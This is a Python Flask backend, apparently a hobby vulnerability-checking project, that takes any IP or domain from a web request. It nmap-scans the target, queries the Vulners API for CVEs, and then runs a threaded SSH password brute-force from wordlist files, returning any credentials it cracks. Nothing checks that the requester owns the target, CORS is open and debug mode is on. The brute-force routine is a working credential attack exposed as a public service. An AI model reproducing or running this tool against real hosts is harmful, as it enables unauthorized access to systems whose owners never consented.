from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import nmap
import paramiko, sys, os, termcolor
import threading, time
import requests, socket, re

app = Flask(__name__, static_folder='FrontEnd/static', template_folder='FrontEnd/templates')
CORS(app)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/status', methods=['GET'])
def status():
    return "Backend is running"

@app.route('/scan', methods=['POST'])
def handle_scan():
    data = request.json
    target = data.get('target')
    if not target:
        return jsonify({'error': 'No target provided'}), 400
    
    if not is_valid_ip(target) and not is_valid_domain(target):
        return jsonify({'error': 'Ingrese una Ip o dominio valido'}), 400
   
    try:
        if is_valid_ip(target):
            target_ip = target
        elif is_valid_domain(target):
            hostname = target.split('://')[-1].split('/')[0]
            target_ip = socket.gethostbyname(hostname)
        else:
            return jsonify({'error': 'Invalid IP or domain'}), 400
    except socket.gaierror as e:
        return jsonify({'error': f'Error resolving target: {e}'}), 400
    
    scan_result = scan(target_ip)
    brute_force_result = start_brute_force(target_ip)
    
    response = {
        'scan_result': scan_result,
        'brute_force_result': brute_force_result,
        'scan_vulnerabilities_found': scan_result['vulnerabilities_found'],
        'brute_force_successful': any(result['status'] == 'success' for result in brute_force_result)
    }
    print("Operación de escaneo y fuerza bruta finalizada.")
    return jsonify(response)

def is_valid_ip(ip):
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    return re.match(pattern, ip) is not None and all(0 <= int(octet) <= 255 for octet in ip.split('.'))

def is_valid_domain(domain):
    domain_pattern = re.compile(
        r"^(?:(?:https?|ftp):\/\/)?(?:[\w-]+\.)+[a-zA-Z]{2,7}$"
    )
    return domain_pattern.match(domain) is not None



API_KEY = os.getenv("API_KEY")

def is_vulnerable(product, version):
    api_url = "https://vulners.com/api/v3/search/lucene/"
    headers = {
        'Content-Type': 'application/json',
        'X-Vulners-ApiKey': API_KEY
    }
    query = f"{product} {version}"
    data = {
        "query": query,
        "size": 1
    }

    try:
        response = requests.post(api_url, headers=headers, json=data)
        response.raise_for_status()
        data = response.json()
        if data.get('data', {}).get('total', 0) > 0:
            vuln_data = data['data']['search'][0]
            title = vuln_data.get('title', 'No disponible')
            cvss_score = vuln_data.get('cvss', {}).get('score', 'No disponible')
            description = vuln_data.get('description', 'No disponible')
            references = vuln_data.get('href', 'No disponible')
            return True, {
                'title': title,
                'cvss_score': cvss_score,
                'description': description,
                'references': references
            }
        else:
            return False, {}
    except requests.exceptions.RequestException as e:
        print(f"Error al consultar la API de Vulners: {e}")
        return False, {}
    except ValueError as e:
        print(f"Error al decodificar la respuesta JSON: {e}")
        return False, {}

def scan(target):
    nm = nmap.PortScanner()
    try:
        nm.scan(hosts=target, arguments='-p 20,21,22,25,53,80,110,123,143,179,443,465,500,587,993,995,2222,3389,41648 -sV -sC')
    except nmap.PortScannerError as e:
        print(f"Error al ejecutar nmap: {e}")
        return {'vulnerabilities_found': False, 'results': [], 'message': 'Error al ejecutar nmap.'}
    except Exception as e:
        print(f"Error inesperado: {e}")
        return {'vulnerabilities_found': False, 'results': [], 'message': 'Error inesperado durante el escaneo.'}

    # Imprimir los resultados sin procesar de nmap
    print(nm.csv())

    scan_results = []
    vulnerabilities_found = False
    filtered_ports = 0
    open_ports = 0

    if not nm.all_hosts():
        print(f"No se encontraron hosts en {target}")
        return {'vulnerabilities_found': False, 'results': [], 'message': 'No se encontraron hosts en el objetivo.'}

    for host in nm.all_hosts():
        host_results = {
            'host': host,
            'protocols': []
        }
        for proto in nm[host].all_protocols():
            protocol_results = {
                'protocol': proto,
                'ports': []
            }
            ports = nm[host][proto].keys()
            for port in ports:
                state = nm[host][proto][port]['state']
                if state == 'filtered':
                    filtered_ports += 1
                if state == 'open':
                    open_ports += 1
                product = nm[host][proto][port].get('product', '')
                version = nm[host][proto][port].get('version', '')
                port_result = {
                    'port': port,
                    'state': state,
                    'product': product,
                    'version': version,
                    'vulnerable': False,
                    'vul_data': {}
                }
                if product and version:
                    is_vuln, vul_data = is_vulnerable(product, version)
                    if is_vuln:
                        vulnerabilities_found = True
                        port_result['vulnerable'] = True
                        port_result['vul_data'] = vul_data
                protocol_results['ports'].append(port_result)
            host_results['protocols'].append(protocol_results)
        scan_results.append(host_results)

    message = 'Scan completed successfully.'
    if not vulnerabilities_found and filtered_ports > 0:
        message = 'No vulnerabilities found, but the majority of ports are filtered.'
    if open_ports == 0:
        message = 'No open ports found.'
    if not vulnerabilities_found and open_ports == 0 and filtered_ports > 0:
        message = 'Your site appears secure as most ports are filtered.'

    return {
        'vulnerabilities_found': vulnerabilities_found,
        'results': scan_results,
        'message': message,
        'filtered_ports': filtered_ports,
        'open_ports': open_ports
    }

def start_brute_force(target):
    stop_flag = False
    max_threads = 5
    thread_limiter = threading.BoundedSemaphore(max_threads)
    brute_force_results = []
    failed_attempts = 0

    def ssh_connect(username, password):
        nonlocal stop_flag, failed_attempts
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(target, port=22, username=username, password=password)
            stop_flag = True
            result = {'username': username, 'password': password, 'status': 'success'}
            print(termcolor.colored(('[+] Found Password: ' + password + ', For User: ' + username), 'green'))
        except paramiko.ssh_exception.AuthenticationException:
            result = {'username': username, 'password': password, 'status': 'failure'}
            print(termcolor.colored(('[-] Incorrect Password: ' + password + ', For User: ' + username), 'red'))
            # failed_attempts += 1
        except paramiko.ssh_exception.SSHException as e:
            result = {'username': username, 'password': password, 'status': 'ssh_exception', 'error': str(e)}
            print(termcolor.colored(('[-] SSH Exception: ' + str(e)), 'red'))
            failed_attempts += 1
        except Exception as e:
            result = {'username': username, 'password': password, 'status': 'connection_failed', 'error': str(e)}
            print(termcolor.colored(('[-] Connection Failed: ' + str(e)), 'red'))
            failed_attempts += 1
        finally:
            brute_force_results.append(result)
            ssh.close()
            thread_limiter.release()
        if failed_attempts >= 3:
            stop_flag = True
            print("Hemos intentado realizar fuerza bruta pero no pudimos.")
            return

    usernames_file = "usernamesReal.txt"
    passwords_file = "passwordsReal.txt"
    print('\n')

    if not os.path.exists(passwords_file):
        print('[!!] That File/Path Doesn\'t Exist')
        sys.exit(1)

    print('Empezando fuerza bruta en host ' + target)

    with open(usernames_file, 'r') as users:
        for username in users:
            username = username.strip()
            with open(passwords_file, 'r') as passwords:
                for password in passwords:
                    password = password.strip()
                    if stop_flag:
                        break
                    thread_limiter.acquire()
                    t = threading.Thread(target=ssh_connect, args=(username, password))
                    t.start()
                    time.sleep(0.5)
                    if stop_flag:
                        break
            if stop_flag:
                break

    return brute_force_results

if __name__ == '__main__':
    app.run(debug=True)